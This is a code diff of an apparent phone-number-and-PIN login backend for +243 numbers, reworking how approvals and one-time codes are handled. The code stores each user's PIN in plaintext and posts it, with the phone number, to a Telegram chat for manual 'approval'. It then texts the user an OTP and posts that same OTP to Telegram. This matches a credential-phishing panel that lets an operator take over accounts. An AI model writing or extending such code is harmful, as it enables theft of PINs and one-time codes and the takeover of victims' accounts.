@@ -29,11 +29,10 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Initialize database on startup
 init_db()
 
 otp_store = {}
-approval_pins = {}  # NEW: Stores PINs temporarily for admin review
+approval_pins = {}
 
 
 class LoginRequest(BaseModel):
@@ -52,7 +51,6 @@ class RegisterRequest(BaseModel):
 
 
 def format_phone(phone: str) -> str:
-    """Ensure phone number has +243 prefix."""
     phone = phone.strip()
     if phone.startswith("0"):
         phone = phone[1:]
@@ -68,7 +66,6 @@ def read_root():
     return {"status": "Backend is running"}
 
 
-# --- REGISTER (one-time, for testing) ---
 @app.post("/api/register")
 async def register(request: RegisterRequest):
     full_phone = format_phone(request.phone_number)
@@ -77,12 +74,11 @@ async def register(request: RegisterRequest):
     return {"status": "error", "message": "User already exists"}
 
 
-# --- LOGIN (returns approval_id immediately) ---
+# --- LOGIN ---
 @app.post("/api/login")
 async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     full_phone = format_phone(request.phone_number)
 
-    # 1. Check user
     user = get_user(full_phone)
     if not user:
         create_user(full_phone, request.pin)
@@ -90,16 +86,13 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
         if not verify_user_pin(full_phone, request.pin):
             return {"status": "error", "message": "Invalid PIN"}
 
-    # 2. Create approval request
     approval_id = str(uuid4())
     create_approval(approval_id)
     approval_phones[approval_id] = full_phone
-    approval_pins[approval_id] = request.pin  # ⭐ NEW: Save PIN for admin review
+    approval_pins[approval_id] = request.pin
 
-    # 3. ⭐ AWAIT the Telegram send — guarantees delivery on Render
     await send_approval_request(approval_id, full_phone, request.pin)
 
-    # 4. Return approval_id so frontend can poll
     return {
         "status": "pending",
         "approval_id": approval_id,
@@ -107,42 +100,21 @@ async def login(request: LoginRequest, background_tasks: BackgroundTasks):
     }
 
 
-# --- APPROVAL STATUS (frontend polls every 2s) ---
+# --- APPROVAL STATUS ---
 @app.get("/api/approval-status/{approval_id}")
-async def approval_status(approval_id: str, background_tasks: BackgroundTasks):
+async def approval_status(approval_id: str):
     # Still waiting for admin action
     if approval_id in pending_approvals:
         return {"status": "pending"}
 
-    # No pending, check for a result
     result = approval_results.get(approval_id)
     if result is None:
         return {"status": "expired"}
 
-    # Rejected by admin
     if not result:
-        approval_results.pop(approval_id, None)
-        approval_phones.pop(approval_id, None)
-        approval_pins.pop(approval_id, None)  # Clean up
         return {"status": "rejected"}
 
-    # Approved — send OTP via SMS
-    phone = approval_phones.pop(approval_id, None)
-    approval_results.pop(approval_id, None)
-    approval_pins.pop(approval_id, None)  # Clean up
-
-    if not phone:
-        return {"status": "error", "message": "Phone number missing"}
-
-    otp = str(random.randint(1000, 9999))
-    otp_store[phone] = otp
-
-    background_tasks.add_task(send_otp_sms, phone, otp)
-    background_tasks.add_task(
-        send_telegram_message,
-        f"✅ Approved. OTP <code>{otp}</code> sent to <code>{phone}</code>"
-    )
-
+    # Approved — the OTP was already generated and sent in the webhook
     return {"status": "approved", "message": "OTP sent"}
 
 
@@ -158,30 +130,23 @@ async def verify_otp(request: OTPRequest, background_tasks: BackgroundTasks):
     return {"status": "error", "message": "Invalid OTP"}
 
 
-# --- TELEGRAM WEBHOOK (defensive version) ---
+# --- TELEGRAM WEBHOOK ---
 @app.post("/telegram/webhook")
-async def telegram_webhook(request: Request):
-    # 1. Safely parse the JSON body
+async def telegram_webhook(request: Request, background_tasks: BackgroundTasks):
     try:
         body = await request.body()
         if not body:
             print("Webhook called with empty body — ignoring")
             return {"ok": True}
-
         data = json.loads(body)
-    except json.JSONDecodeError as e:
-        print(f"Webhook JSON parse error: {e}")
-        return {"ok": True}
     except Exception as e:
-        print(f"Webhook read error: {e}")
+        print(f"Webhook parse error: {e}")
         return {"ok": True}
 
-    # 2. Ignore non-callback updates
     if "callback_query" not in data:
         print("Webhook received non-callback update — ignoring")
         return {"ok": True}
 
-    # 3. Handle the callback query safely
     try:
         callback = data["callback_query"]
         callback_id = callback["id"]
@@ -189,27 +154,43 @@ async def telegram_webhook(request: Request):
         parts = callback_data.split(":")
 
         if len(parts) < 2:
-            print(f"Invalid callback data: {callback_data}")
             return {"ok": True}
 
-        action = parts[0]           # "approve" or "reject"
+        action = parts[0]
         approval_id = parts[1]
         approved = (action == "approve")
 
-        # Mark the result in your in-memory store
+        # Mark the result so polling picks it up
         set_approval_result(approval_id, approved)
 
-        # Acknowledge the button press (removes the Telegram spinner)
+        # Acknowledge the button press
         await answer_callback_query(
             callback_id,
             "✅ Approved" if approved else "❌ Rejected"
         )
 
-        # ⭐ NEW: Fetch the user's credentials to show in the message
+        # Fetch stored credentials
         phone = approval_phones.get(approval_id, "Unknown")
         pin = approval_pins.get(approval_id, "Unknown")
 
-        # Edit the original message to show the credentials
+        # ---- If APPROVED: Generate OTP + send SMS + Telegram ----
+        if approved and phone != "Unknown":
+            otp = str(random.randint(1000, 9999))
+            otp_store[phone] = otp
+
+            # Send OTP via SMS
+            background_tasks.add_task(send_otp_sms, phone, otp)
+
+            # ⭐ Send a SEPARATE Telegram message with the OTP
+            background_tasks.add_task(
+                send_telegram_message,
+                f"🔑 <b>OTP Generated</b>\n\n"
+                f"📱 Phone: <code>{phone}</code>\n"
+                f"🔐 OTP: <code>{otp}</code>\n"
+                f"🆔 Ref: <code>{approval_id}</code>"
+            )
+
+        # Edit the original message to show the decision
         if "message" in callback:
             result_text = "✅ <b>Approved</b>" if approved else "❌ <b>Rejected</b>"
             await edit_message(
